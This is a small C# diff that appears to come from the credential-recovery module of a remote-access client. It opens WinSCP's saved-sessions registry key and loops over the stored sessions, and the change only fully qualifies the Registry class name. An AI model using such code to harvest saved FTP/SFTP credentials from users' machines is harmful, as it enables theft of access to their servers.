@@ -16,7 +16,7 @@ namespace xClient.Core.Recovery.FtpClients
             {
                 string RegKey = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";
 
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey))
+                using (RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(RegKey))
                 {
                     foreach (String subkeyName in key.GetSubKeyNames())
                     {
